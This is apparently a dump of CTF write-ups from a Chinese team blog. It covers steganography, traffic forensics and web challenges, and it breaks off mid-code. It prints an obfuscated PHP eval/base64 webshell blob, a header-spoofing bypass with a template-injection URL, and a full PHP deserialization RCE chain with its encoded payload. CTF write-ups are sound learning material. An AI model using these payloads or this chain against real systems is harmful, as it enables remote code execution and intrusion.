i: 40 data: t i: 41 data: i i: 42 data: n i: 43 data: g i: 45 data: t i: 46 data: h i: 47 data: e i: 49 data: e i: 50 data: p i: 51 data: i i: 52 data: d i: 53 data: e i: 54 data: m i: 55 data: i i: 56 data: c aaa = \u0026#34;fdzy{Xldq_zloo_fhuwdlqoy_vxffhhg_lq_iljkwlqj_wkh_hslghplf}\u0026#34; \u0026gt;\u0026gt;\u0026gt; flag2 = \u0026#34;\u0026#34; \u0026gt;\u0026gt;\u0026gt; for i in range(len(aaa)): ... flag2 += chr(ord(aaa[i])-3) \u0026gt;\u0026gt;\u0026gt; flag2 \u0026#39;cawvxUian\\\\will\\\\certainlv\\\\succeed\\\\in\\\\fighting\\\\the\\\\epidemicz\u0026#39; #根据上面的对应然后将其进行整理可得 cazy{Xian_will_certainly_succeed_in_fighting_the_epidemic} flag:\ncazy{Xian_will_certainly_succeed_in_fighting_the_epidemic}\r无字天书 蚁剑流量\n流量后面发现 zip 文件的头部 hex 504B\n\r\n提取出来后发现是一个 zip\n解压后得到 key.ws 和 flag.txt\n\r\nkey.ws是whitesapce\nhttp://vii5ard.github.io/whitespace/\n\r\n得到密码 XiAnWillBeSafe\n再去用 snow 去利用这个密码解 flag.txt\n\r\nflag:\ncazy{C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng}\r西安加油 流量 http 对象导出 secret.txt\n解 base64 发现是一个压缩包\n后面部分就是拼图\n\r\n还原结果\n\r\nbinary file命令 显示这是个class文件\n利用luyten反编译得到源码\n发现是一堆数据 ascii转chr\nMDAwMDAwMDEwMTExMDAwMDAwMDAxMTExMTEwMTExMDAwMDAwMFxuMDExMTExMDEwMTEwMTAxMDExMTExMDAwMTExMDExMDExMTExMFxuMDEwMDAxMDEwMDAwMTExMTAwMDExMTAxMDExMDExMDEwMDAxMFxuMDEwMDAxMDExMDAwMDAxMTAwMDExMTAwMDAwMTAxMDEwMDAxMFxuMDEwMDAxMDExMTAxMTAxMTAwMTEwMTEwMTAxMTExMDEwMDAxMFxuMDExMTExMDEwMTExMDEwMDAwMDAwMTAwMTAwMDAxMDExMTExMFxuMDAwMDAwMDEwMTAxMDEwMTAxMDEwMTAxMDEwMTAxMDAwMDAwMFxuMTExMTExMTEwMDEwMDAwMDAwMDEwMDExMDAxMTExMTExMTExMVxuMTEwMDAxMDEwMTAxMDAwMDEwMTExMTExMDEwMDAwMDAxMTAwMFxuMDEwMTEwMTAwMDExMDAxMDAxMDAwMDEwMDExMDEwMTAxMTEwMVxuMTAxMTAwMDAwMTAwMTExMTAwMTEwMDAxMTAxMDAwMDAxMDAxMFxuMTExMDExMTExMTExMDAxMDEwMTEwMTAwMDExMDEwMTAxMTEwMFxuMTAxMDExMDAwMTExMDAwMDAwMDExMDEwMDAwMDAwMDAwMDAxMFxuMDExMDEwMTAwMTAwMDEwMDAxMTAxMTEwMTAxMTEwMTExMTEwMVxuMDAxMDEwMDEwMDExMTExMTEwMTExMDAwMDExMDAxMDEwMDAxMFxuMDAxMDAwMTEwMTExMDExMDExMDAxMTAwMTEwMDExMDAxMTEwMVxuMTExMDEwMDExMDAwMTExMTExMTAxMTAxMDAxMTAwMDAwMDAxMFxuMDAwMDExMTAxMDEwMDAxMTEwMDAwMDEwMTEwMTExMTExMDExMVxuMTEwMTEwMDExMDEwMTEwMTAwMTEwMDAxMDEwMDExMDAwMDEwMFxuMDEwMTAwMTAwMTExMTAwMTAwMDAwMTAwMTExMDAxMDAxMDExMVxuMDEwMTAxMDAxMTAwMDExMTAwMDExMDAxMDAwMDAxMDEwMTAwMFxuMTAwMTEwMTExMTEwMTExMDExMDAxMDAxMTExMTEwMTAxMTEwMVxuMTEwMTEwMDAxMDExMTAwMDAwMDEwMTExMDExMDAwMTAxMTAxMFxuMDAxMTAwMTAwMDExMTEwMTEwMDAxMTExMDEwMDEwMDExMTEwMVxuMDEwMTAwMDAwMTExMDEwMTExMDExMDEwMTExMTExMDEwMDAxMFxuMDEwMTAxMTAxMTAwMTAwMTAwMDAwMDExMDEwMDAxMDAxMTExMVxuMDExMDEwMDAxMDAwMTExMDAxMDExMDAxMTAxMTExMTAwMTEwMFxuMDExMTAwMTExMTEwMDAwMDAxMDExMDExMDExMTAwMTExMTEwMFxuMDEwMDExMDAxMDExMDAxMDEwMDAxMDExMTAxMTAwMDAwMDAwMFxuMTExMTExMTEwMTAxMTAwMTExMDAxMTEwMDEwMTAxMTEwMTAxMVxuMDAwMDAwMDExMTAwMDExMTAxMTAxMDExMDAwMTAxMDEwMDEwMFxuMDExMTExMDExMTAwMTEwMTAxMDExMDEwMTEwMDAxMTEwMTExMVxuMDEwMDAxMDEwMDExMDAwMDExMDAxMTAxMDAwMDAwMDAwMDAxMFxuMDEwMDAxMDEwMTExMTEwMTEwMDAxMTExMTExMTExMDEwMDExMVxuMDEwMDAxMDEwMTEwMTExMTExMTEwMDAwMDAxMDEwMTAxMDExMFxuMDExMTExMDExMTExMTAwMDEwMTEwMTAwMTExMTAwMDExMDExMFxuMDAwMDAwMDExMTExMTAxMTExMDExMDAwMDAwMDEwMDAxMTAwMA==\rbase64之后得到1369个01的组合 可被开方为37推测其应该是一个二维码\n画图:\nfrom PIL import Image MAX = 37 pic = Image.new(\u0026#34;RGB\u0026#34;,(MAX,MAX)) str = \u0026#34;0000000101110000000011111101110000000011111010110101011111000111011011111001000101000011110001110101101101000100100010110000011000111000001010100010010001011101101100110110101111010001001111101011101000000010010000101111100000000101010101010101010101010000000111111110010000000010011001111111111111000101010100001011111101000000110000101101000110010010000100110101011101101100000100111100110001101000001001011101111111100101011010001101010111001010110001110000000110100000000000010011010100100010001101110101110111110100101001001111111011100001100101000100010001101110110110011001100110011101111010011000111111101101001100000001000001110101000111000001011011111101111101100110101101001100010100110000100010100100111100100000100111001001011101010100110001110001100100000101010001001101111101110110010011111101011101110110001011100000010111011000101101000110010001111011000111101001001111010101000001110101110110101111110100010010101101100100100000011010001001111101101000100011100101100110111110011000111001111100000010110110111001111100010011001011001010001011101100000000011111111010110011100111001010111010110000000111000111011010110001010100100011111011100110101011010110001110111101000101001100001100110100000000000100100010101111101100011111111110100111010001010110111111110000001010101011001111101111110001011010011110001101100000000111111011110110000000100011000\u0026#34; i = 0 for y in range(0,MAX): for x in range(0,MAX): if(str[i] == \u0026#39;0\u0026#39;): pic.putpixel([x,y],(0,0,0)) else: pic.putpixel([x,y],(255,255,255)) i = i + 1 pic.show() pic.save(\u0026#39;flag.png\u0026#39;) 得到的二维码扫码得到flag\n\r\nflag:\nflag{932b2c0070e4897ea7df0190dbf36ece}\rEz_Steg 压缩包注释告诉说是6个数字 爆破压缩包密码得到220101\n然后得到两个文件\nstegosaurus工具求解pyc隐写\n\r\n得到 TheKey:St3g1sV3ryFuNny\nemjoy猜测是 emjoy-aes\nhttps://aghorler.github.io/emoji-aes/\n解码得到flag\nflag:\ncazy{Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke}\rez_Encrypt 蚁剑流量\n解一下一开始的base64发现是pop链\n但是都不重要 直接锁定最后的web123\nbase64解开以后是一个压缩包\n解压后在app\\controller\\index.php找到了混淆后的php代码\n\u0026lt;?php define('IKlSux1227',__FILE__);$DusPFr=base64_decode(\u0026quot;bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqZHF0d3lpT2VBY1VaTHBDdUhuYm1ndkZzZlNhUFlsTUpCTmpSVmtLeFFEVFdJcnpFb1hHaA==\u0026quot;);$arCiCL=$DusPFr[3].$DusPFr[6].$DusPFr[33].$DusPFr[30];$VvUrBZ=$DusPFr[33].$DusPFr[10].$DusPFr[24].$DusPFr[10].$DusPFr[24];$DEomKk=$VvUrBZ[0].$DusPFr[18].$DusPFr[3].$VvUrBZ[0].$VvUrBZ[1].$DusPFr[24];$LnpnvY=$DusPFr[7].$DusPFr[13];$arCiCL.=$DusPFr[22].$DusPFr[36].$DusPFr[29].$DusPFr[26].$DusPFr[30].$DusPFr[32].$DusPFr[35].$DusPFr[26].$DusPFr[30];eval($arCiCL(\u0026quot;JFZDQlpRVz0iZ29NVFFoZXFpYVVPdWJtWWZSSlNya1dObmRFc1BaR2pBS3BDVnRCSUh3REZ4Y3pYTGx2eVlUY2lVdVBuZ3BzeXFib09saGpGSVpOU3d6bU1IR3ZEeHRrWFZhV2ZkQUpFclJLTENCUWVISjlBcGR4WUd2Vm9wTjVCdFh6WmhCdXVwWmZyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aR21qbmkwOWpITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJPMXo0ekV6cWlEVkdjMUdVVnYxQXMxU3ZVWjVzRkVrVFZaVk1iVkVMR0VqRGJCZktWMHVBek5tQXpkekZoVmtrc05ycGIxek9wRWhwVktCdlZEV1podkVMc0JHaUdLMDlmZ1o3am1rM2JadTFWSzBaR21qbmkwOWpOS1N6Q2doWlVva0hpMEJiU0IwcWp2aFhwWjlIRlZNS2MxMHFqdmhYcFo5SEZWTUtjRTA3amRHaGl2emRGSzBaR21qbmkwOWpOS2NLTEY0Wkdtam5pMDlqTkttQUxGNFpHbWpuaTA5ak5LZjBMRjRaR21qbmkwOWpOS21BTEY0Wkdtam5pMDlqTktmMExpTVpOTkdNendHc0hGaDJzc3J3aDBhYmNFMHFqdmhYcFo5SEZWTXJ5RTBxanZoWHBaOUhGVk1LTEY0WnpCRWNHMHpDTktXekNnaDJzc3J3aDBhYmNWMHFqdmhYcFo5SEZWTWVTRTA3anYxRVVWRXZPSzBaR21qbmkwOWpOS3p6Q2doWlVva0hpMEJiY2lTenllaHR6MjVmelZScUhGaFpVb2tIaTBCYmNEanpDZ2haVW9rSGkwQmJjS0d6Q2doWlVva0hpMEJiY0RCekNnaFpVb2tIaTBCYmNER3pDZ2haVW9rSGkwQmJjS1d6Q2doWlVva0hpMEJiY0tqekNnaFpVb2tIaTBCYmNLVnpDZ2haVW9rSGkwQmJjREd6Q2doWlVva0hpMEJiY0tXenkyVjJPTkFUam1rM2JadTFWZVlnRlpWcGlWVHJSZGtOcERXa1ZFVjBSQlRlU0xoc2hOck1zTnJwcEJqT05vQlpoTmhFR05hVE9WR05HbWpaVjFUS1YwenZTVmphUEVWREZtNTVOWnpBaHZmZXBFalZjb3JpczJyTVNFVUtoWjlWaFZqSlZ2NU16VlRBekVXZ2hOdUZPS2pwczFaS05CekJidmhTVlpWeXBWQk5SSldwVk5yTk9EV05oMVZkYkVoZ1ZOVUtWRXVYUHZWZHNCQlpWb3JlczIxQVBORUVoWmpCcG9yTVZCVjRwdlZWaEJ1eWhKV2tpS2pOY0JCTHoyOXRQRFlJRndaMHAxU3FHZFZpRkVHT0YwU0ZjQlZWUHY1RmNkU1FGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxFU3BOYUtGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxTdGhLRXZzVkd2aDFCNXAzU3Rob3JhT1p1cGNCR0pHMmFGcDN1cVYyNXlWMHJtVUxTdGhLRXZzVkd2aDFCNXAzV0NzMk0zZmdaa3lLOCtISjlBcGR4WUd2Vm9wTjVCdFh6ZEdOU3RiczRyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aaEJrUVBtajBITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJHc1ZaVnZtZVNMekRiRVQyT0tFRk52aGFWWmhWYm1HME9OMVROTkVPYkVFWmNOclVzS1dGekJFSWJtYU5WMEduc1ZzMXBWalZwZFNwRm1HdXNvNUZjVmhkTm81c3NpMDlmZ1o3anYxcVYydWlGSjBaaEJrUVBtajBOS1N6Q2dodk5vOTRVd2hiU0IwcWptR3BiM3VYekVNS2MxMHFqbUdwYjN1WHpFTUtjRTA3akVHR1YyUzRHSjBaaEJrUVBtajBOS2NLTEY0WmhCa1FQbWowTkttQUxGNFpoQmtRUG1qME5LZjBMRjRaaEJrUVBtajBOS21BTEY0WmhCa1FQbWowTktmMExpTVpPTkdWekJ6c0hGaE5OVnpEUHZoYmNFMHFqbUdwYjN1WHpFTXJ5RTBxam1HcGIzdVh6RU1LTEY0WlZCQkxPM3VaTktXekNnaE5OVnpEUHZoYmNWMHFqbUdwYjN1WHpFTWVTRTA3anZCWnoyclNzSzBaaEJrUVBtajBOS3p6Q2dodk5vOTRVd2hiY2lTenllaGFiQnpUczBZcUhGaHZObzk0VXdoYmNEanpDZ2h2Tm85NFV3aGJjS0d6Q2dodk5vOTRVd2hiY0RCekNnaHZObzk0VXdoYmNER3pDZ2h2Tm85NFV3aGJjS1d6Q2dodk5vOTRVd2hiY0tqekNnaHZObzk0VXdoYmNLVnpDZ2h2Tm85NFV3aGJjREd6Q2dodk5vOTRVd2hiY0tXenkyVjJPTkFUanYxcVYydWlGWFlnRlp6cHMxVnFzRGhHUERXa1ZOYTRpMmhJY2loQmJOdW5zWlZwc3ZoRUZCekZjc0d1czF1WnpWa2RjTEJnaEJqTnNpVzBob0VMR3YxQlZvcnJWaVN5UEVFTlVaYVpObWprczB6TnBFenZHZGpnYzFmMXMxek1SQlpyaW81R1ZzRzRPREVGT1ZWRUd2ckZWTGhKVm1zcnMyU2RTVmpOY0JrS3NaR01oRWhJTndrWmNEbTJWMEdwY0JTZFJ2Qk5ORU8wczI1dHN2RWRzRGpoVnZySnMyNU5WMmp2VkJTRFZCanZPMmFNVTJjQXlza2dwM2hmTzFWdHB2U0xpRFNOVm1acmlzenZzMDlPUkVHRmNzamRPRFd0cDJqRWNMQmlWS1Zjc0RTdlUxQk9ob2twYlo1NXMxUjFibTFuYmRFc05FR2pPVkdORkVaZVNOdVpjM1dLTm9ydEZvVnFpd0JpVlo1Y3NaUjFSVmpWR0VFeWhMaGZWc2hGaUJmclV3RUZORUdlc2lqTnMyU05pWkdOY3ZyQVZCVjRjRWpNVkxCR2MzV3ZPMmEwUjJWRUZvYWhjZGhhVm9heXB2aE5VQmtOVk5oMUdKVzBGRWpzaEJHVnAyYTNzMk00U05FSXptdWdiTFd2c0RFV2N2amRObzlnaExoYVZvYXlpdmhPUmRTaWNCa0xzaVcwYlZHSWlacnBiZFdrc0JHTWhFVEFWQldTVnNreUdFelRwMVNmaGlWWk5FamhHbUdORnMwclJkV0dWMWt5VkV6NHp2am5HdjFMVkJrbXNLanBWMW1BenYxTnAwNWNOb3JwaEVjS1ZCRXVic1Y1VnNWcEYxVUtoREdpYlpra09vMTRGRVNkR3Z1U2J2UzVzMXVFU05FRVZCV2lWMnJ2c0RFWnAxU2ZoaVZaTkVqaEdtR05GczByUmRXR1Yxa3lWRXo0enZFbUd2MUxWQmttc0tqcFYxbUF6djFOcDA1SE5CekZoRWNlTkJ6aGNkaGFWb2F5aXZoVnBkVnNORUdoc29yTk5CR01iRUVTYm1mMk8za2pTVkdFemR1WmgycmNzWlZNT1ZVZVNOcnBjZGg0TkRqdEZzMXFod0VpY0VqdE9WR05zRU9BaUJqU3BCanFzS1NaU29qRXp2MU5wMDVjR0VoWFIxa01iRXpoY2RoYVYyYXRpQlVBcEpHaXBLQmVzaVdOaVZWZFJka1NjMWprVkJoamNFbWVWQmhaaEVUMFZEajBVMUdOaFprWmJFR3BzaWp0YlZ6Tk5aaGljQmt1aURqcE5CR0lpWnJwYkVrbXNLanBWMW1laEJTVmhtanlPMmFUUlZjZU5aNVpjMDU1Tk5rTlNtMU5SbXJOYzBzMVYwVkFzb2h2c3dqVmh2dW5OVmhFU1ZzZXptak5wMGtlc1ZHQWkyRTZGd3VWTnZ1NU9va05TdlNhU0pFQkZtazFpQnVUUE5qbmJtQlZjM1dLc0tqcFYxbUF6SkVTaDN1SE5Cemh5c0JuenZyWmJzR0tGMFNEQzFXa08zVnRoS0UxVkRqVFZFU0pHMmFOYnZyT05pU1RwMGFKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc0Yya2pSbXJKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc2ltU0ZSRWtmR2RTc1ZaMUFpbVNGcEVrTVZEak5jVkVRRlp6cHMxVnFzRGhHUEx6M2ltU0ZSRWtmR2RTc1ZaMUFGMVNJUm05M0hpMGd0Rlo3SEs0PSI7ZXZhbCgnPz4nLiRhckNpQ0woJFZ2VXJCWigkREVvbUtrKCRWQ0JaUVcsJExucG52WSoyKSwkREVvbUtrKCRWQ0JaUVcsJExucG52WSwkTG5wbnZZKSwkREVvbUtrKCRWQ0JaUVcsMCwkTG5wbnZZKSkpKTs=\u0026quot;));?\u0026gt;\r硬解 eval变echo的 差不多解个6层\n最后可以getflag\n\r\nflag:\ncazy{PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy}\r","date":"2022-01-13T13:23:41+08:00","image":"https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/cover_hu2ef483a7301ed58558e75f3e1747bee2_206467_120x120_fill_box_smart1_3.png","permalink":"https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/","title":"长安战“疫” Writeup"},{"content":"Web loginme 第一步绕过本地验证，x-forwarded-for 和 client-ip 被过滤了，X-Real-IP:127.0.0.1 绕过\n第二步是 gin 的模板注入，让 id 为一个不存在的值，age 为 {{.Password}} 就可以获得 admin 结构体中的 Password 变量值了。\nhttp://124.71.166.197:18001/admin/index?id=5\u0026amp;age={{.Password}}\nUpload_it 可以任意上传 /tmp 目录下文件， 可以直接写进 session 文件。查看 phpinfo 发现 session 的处理器是 php，于是可以把 upload_path|$serialize 写进 /tmp/sess_or4nge，然后改自己的 session_id 为 or4nge，即可触发反序列化。\n利用给的 Composer.json：\n\u0026#34;symfony/string\u0026#34;: \u0026#34;^5.3\u0026#34;, \u0026#34;opis/closure\u0026#34;: \u0026#34;^3.6\u0026#34; 结合出题人发布的文章 https://www.anquanke.com/post/id/217929#h2-3 找到一条链，其中 lazystring 的任意无参数函数调用接的是闭包函数 __invoke，可以将闭包函数序列化进去。\n\u0026lt;?php namespace Symfony\\Component\\String{ require \u0026#34;path\\to\\autoload.php\u0026#34;; class LazyString{ private $value; public function __construct() { $func = function(){system(\u0026#34;cat /flag\u0026#34;);}; $d = new \\Opis\\Closure\\SerializableClosure($func); $this-\u0026gt;value = $d; } } class UnicodeString{ protected $string = \u0026#39;\u0026#39;; public function __construct() { $this-\u0026gt;string=new LazyString; } } } namespace { $exp=print(urlencode(serialize(new Symfony\\Component\\String\\UnicodeString()))); } 其实这条链本地没有打通，原因是因为在 UnicodeString.php 里，对 $this-\u0026gt;string 进行了限制\npublic function __wakeup() { if (!\\is_string($this-\u0026gt;string)) { throw new \\BadMethodCallException(\u0026#39;Cannot unserialize \u0026#39;.__CLASS__); } normalizer_is_normalized($this-\u0026gt;string) ?: $this-\u0026gt;string = normalizer_normalize($this-\u0026gt;string); } 但是猜到出题人以前发布过，直接盲打过去，RCE 成功。\nupload_path|O%3A38%3A%22Symfony%5CComponent%5CString%5CUnicodeString%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00string%22%3BO%3A35%3A%22Symfony%5CComponent%5CString%5CLazyString%22%3A1%3A%7Bs%3A42%3A%22%00Symfony%5CComponent%5CString%5CLazyString%00value%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A196%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22function%22%3Bs%3A32%3A%22function%28%29%7Bsystem%28%22cat+%2Fflag%22%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3Bs%3A35%3A%22Symfony%5CComponent%5CString%5CLazyString%22%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%2200000000034bf950000000005225a861%22%3B%7D%7D%7D%7D FUMO_on_the_Christmas_tree 强网杯 pop_master 魔改的题\n首先是对 __invoke 和 __call 的魔术方法的类进行改写，全部能改写为正常的形式：\nimport re from base64 import b64decode def erase_call(FILEIN, FILEOUT): fp = open(FILEIN, \u0026#39;rb\u0026#39;) fo = open(FILEOUT, \u0026#39;wb\u0026#39;) FILE = [_.decode().replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;) for _ in fp.readlines()] i = 0 while i \u0026lt; len(FILE): line = FILE[i] if \u0026#39;__call\u0026#39; in line: l1, l2 = FILE[i + 1], FILE[i + 2] use_func = re.search(r\u0026#39;extract\\(\\[\\$name =\u0026gt; \\\u0026#39;(.*)\\\u0026#39;\\]\\);\u0026#39;, l1)[1] pattern = re.search(r\u0026#39;if \\(is\\_callable\\(\\[\\$this\\-\\\u0026gt;(.*)\\, \\$(.*)\\]\\)\\)\u0026#39;, l2) obj_name, func_name = pattern[1], pattern[2] new_code = [] new_code.append(\u0026#39; public function %s($value) {\\n\u0026#39; % func_name) new_code.append(\u0026#39; if (is_callable([$this-\u0026gt;%s, %s])) @$this-\u0026gt;%s-\u0026gt;%s($value);\\n\u0026#39; % (obj_name, use_func, obj_name, use_func)) new_code.append(\u0026#39; }\\n\u0026#39;) for j in new_code: fo.write(j.encode()) i += 4 else: fo.write((line + \u0026#39;\\n\u0026#39;).encode()) i += 1 fp.close() fo.close() def erase_invoke(FILEIN, FILEOUT): fp = open(FILEIN, \u0026#39;rb\u0026#39;) fo = open(FILEOUT, \u0026#39;wb\u0026#39;) FILE = [_.decode().replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;) for _ in fp.readlines()] i = 0 while i \u0026lt; len(FILE): line = FILE[i] if \u0026#39;@call_user_func\u0026#39; in line: pattern = re.search(r\u0026#39;call_user_func\\(\\$this\\-\\\u0026gt;(.*)\\, \\[\\\u0026#39;(.*)\\\u0026#39;\\=\\\u0026gt; \\$(.*)\\]\\);\u0026#39;, line) # print(pattern) obj_name, use_func, func_para = pattern[1], pattern[2], pattern[3] # print(obj_name, use_func, func_para) new_code = \u0026#34; if (is_callable([$this-\u0026gt;%s, \u0026#39;%s\u0026#39;])) @$this-\u0026gt;%s-\u0026gt;%s(%s);\\n\u0026#34; % (obj_name, use_func, obj_name, use_func, func_para) fo.write(new_code.encode()) elif \u0026#34;__invoke\u0026#34; in line: l1, l2 = FILE[i + 1], FILE[i + 2] key = re.search(r\u0026#39;\\$key = base64_decode\\(\\\u0026#39;(.*)\\\u0026#39;\\);\u0026#39;, l1)[1] key = b64decode(key.encode()).decode() pattern = re.search(r\u0026#39;\\$this\\-\\\u0026gt;(.*)\\-\\\u0026gt;(.*)\\(\\$value\\[\\$key\\]\\);\u0026#39;, l2) try: obj_name, use_func = pattern[1], pattern[2] except: print(line) print(l1) print(l2) new_code = [] new_code.append(\u0026#39; public function %s($value) {\\n\u0026#39; % key) new_code.append(\u0026#39; if (is_callable([$this-\u0026gt;%s, %s])) @$this-\u0026gt;%s-\u0026gt;%s($value);\\n\u0026#39; % (obj_name, use_func, obj_name, use_func)) new_code.append(\u0026#39; }\\n\u0026#39;) for j in new_code: fo.write(j.encode()) i += 3 else: fo.write((line + \u0026#39;\\n\u0026#39;).encode()) i += 1 fp.close() fo.close() erase_invoke(\u0026#39;class.code.txt\u0026#39;, \u0026#39;mid_class.txt\u0026#39;) erase_call(\u0026#39;mid_class.txt\u0026#39;, \u0026#39;final_class.txt\u0026#39;) 在最终代码里手动把 namespace christmasTree 里去掉，之后进行 PHP_Paser 对这份代码进行语法树构建分析：\n\u0026lt;?php ini_set(\u0026#39;memory_limit\u0026#39;, \u0026#39;1024M\u0026#39;); require \u0026#39;path\\to\\autoload.php\u0026#39;; error_reporting(0); use PhpParser\\Error; //use to catch error use PhpParser\\NodeDumper; //use to read node use PhpParser\\ParserFactory; //use to anlaysis code use PhpParser\\PrettyPrinter; $inputPhpFile = \u0026#39;final_class.txt\u0026#39;; $code = file_get_contents($inputPhpFile); $parser = (new ParserFactory)-\u0026gt;create(ParserFactory::PREFER_PHP7); try { $stmts = $parser-\u0026gt;parse($code); } catch (Error $e) { echo \u0026#34;Parse error:{$e-\u0026gt;getMessage()}\\n\u0026#34;; exit(0); } echo \u0026#34;[+] get file done\\n\u0026#34;; $deleteCnt = 0; $deleteCla = 0; $nodeDumper = new NodeDumper; $class_num = 0; $func_list = array(); $fp = fopen(\u0026#34;function_list.txt\u0026#34;, \u0026#34;wb\u0026#34;); $fo = fopen(\u0026#34;deploy_list.txt\u0026#34;, \u0026#34;wb\u0026#34;); $fd = fopen(\u0026#34;destination.txt\u0026#34;, \u0026#34;wb\u0026#34;); foreach ($stmts as $k =\u0026gt; $class_point) { if ($class_point-\u0026gt;gettype() === \u0026#39;Stmt_Nop\u0026#39;) continue; if ($class_point-\u0026gt;gettype() === \u0026#39;Stmt_Class\u0026#39;){ $class_name = $class_point-\u0026gt;name-\u0026gt;name; $class_num++; foreach ($class_point-\u0026gt;stmts as $kk =\u0026gt; $subpoint) { if ($subpoint-\u0026gt;gettype() === \u0026#39;Stmt_Nop\u0026#39;) continue; if ($subpoint-\u0026gt;gettype() === \u0026#39;Stmt_Property\u0026#39;) { ; } if ($subpoint-\u0026gt;gettype() === \u0026#34;Stmt_ClassMethod\u0026#34;) { $func_name = $subpoint-\u0026gt;name-\u0026gt;name; if ($func_name === \u0026#39;__destruct\u0026#39;) { $entrance = $class_name; break; } if (!$subpoint-\u0026gt;params) { continue; } $parms = $subpoint-\u0026gt;params[0]-\u0026gt;var-\u0026gt;name; fwrite($fp, $class_name.\u0026#39; \u0026#39;.$func_name.\u0026#34;\\n\u0026#34;); $pass_way = \u0026#34;pass\u0026#34;; foreach ($subpoint-\u0026gt;stmts as $kkk =\u0026gt; $method_point) { if ($method_point-\u0026gt;gettype() === \u0026#39;Stmt_Expression\u0026#39;) { $assign_1 = $method_point-\u0026gt;expr-\u0026gt;expr-\u0026gt;var-\u0026gt;name; $use_func = $method_point-\u0026gt;expr-\u0026gt;expr-\u0026gt;expr-\u0026gt;name-\u0026gt;parts[0]; $assign_2 = $method_point-\u0026gt;expr-\u0026gt;expr-\u0026gt;expr-\u0026gt;args[0]-\u0026gt;value-\u0026gt;name; if($use_func === null) { $assign_2 = $method_point-\u0026gt;expr-\u0026gt;expr-\u0026gt;expr-\u0026gt;name; $use_func = \u0026#34;pass\u0026#34;; } else { $func_list[$use_func] = 1; } if($assign_1 !== $assign_2) break; $pass_way = $use_func; if(in_array($pass_way, array(\u0026#34;sha1\u0026#34;, \u0026#34;md5\u0026#34;, \u0026#34;crypt\u0026#34;))) { break; } } else if($method_point-\u0026gt;gettype() === \u0026#39;Stmt_If\u0026#39;) { if ($method_point-\u0026gt;stmts[0]-\u0026gt;expr-\u0026gt;name-\u0026gt;parts[0] == \u0026#34;readfile\u0026#34;) { fwrite($fd, $class_name.\u0026#39; \u0026#39;.$func_name.\u0026#39; \u0026#39;.$parms.\u0026#34;\\n\u0026#34;); break; } $use_obj = $method_point-\u0026gt;stmts[0]-\u0026gt;expr-\u0026gt;expr-\u0026gt;var-\u0026gt;name-\u0026gt;name; $use_func = $method_point-\u0026gt;stmts[0]-\u0026gt;expr-\u0026gt;expr-\u0026gt;name-\u0026gt;name; fwrite($fo, $class_name.\u0026#39; \u0026#39;.$func_name.\u0026#39; \u0026#39;.$use_obj.\u0026#34; \u0026#34;.$use_func.\u0026#34; \u0026#34;.$pass_way.\u0026#34;\\n\u0026#34;); } } } } } } echo \u0026#39;[+] filter done\u0026#39; . \u0026#34;\\n\u0026#34;; echo $entrance; fclose($fp); fclose($fo); 构建把所有类的名称，函数，终点的类的函数，以及函数调用关系分别存储起来。 其中有一些污点过滤，比如 md5, sha1, ucfirst, crypt 的调用直接无视，赋值两边参数不等的也直接无视，另外发现 base64 解码的时候出现的不可见字符也会对后面产生影响，故把所有进行 base64_decode 部分全部剪掉。\n然后手动加一下 __destruct 在文件里，把这三个文件放在一起，然后用C语言寻找可行链。\n#include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; #define mem(a,b) memset(a,b,sizeof(a)) typedef long long LL; typedef pair\u0026lt;string, string\u0026gt; PII; #define X first #define Y second inline int read() { int x = 0, f = 1; char c = getchar(); while(!isdigit(c)){if(c == \u0026#39;-\u0026#39;)f = -1;c = getchar();} while(isdigit(c)){x = x * 10+ c-\u0026#39;0\u0026#39;; c = getchar();} return x * f; } const int maxn = 20010; struct Edge { int u, v, next; PII w; Edge(){} Edge(int _1, int _2, int _3, string _4, string _5): u(_1), v(_2), next(_3) { w = make_pair(_4,_5); } }e[maxn\u0026lt;\u0026lt;4]; int first[maxn], ce = -1, tot, tag[maxn]; string name[maxn], func[maxn], use[maxn]; struct Class { string name, func; Class() {} Class(string _1, string _2):name(_1), func(_2) {}\tbool operator \u0026lt; (const Class \u0026amp;s)const{ if(name == s.name){ return func \u0026lt; s.func; } return name \u0026lt; s.name; } }a[maxn]; int pre[maxn], n; PII prew[maxn]; void addEdge(int a,int b, string c,string d) { e[++ce] = Edge(a, b, first[a], c, d); first[a] = ce; }\tmap\u0026lt;Class, int\u0026gt; M; int match(Class A,string use_func, string use_obj, string pass) { for (int i = 1; i \u0026lt;= n; i++) { if (M[A] == i) continue; if (use_func == a[i].func) { addEdge(M[A], M[a[i]], use_obj, pass); } } } bool vis[maxn]; int count_chain; void dfs(int now, int fa) { vis[now] = 1; if (tag[now]) { count_chain ++; int tmp = now; cout \u0026lt;\u0026lt; a[tmp].name \u0026lt;\u0026lt; 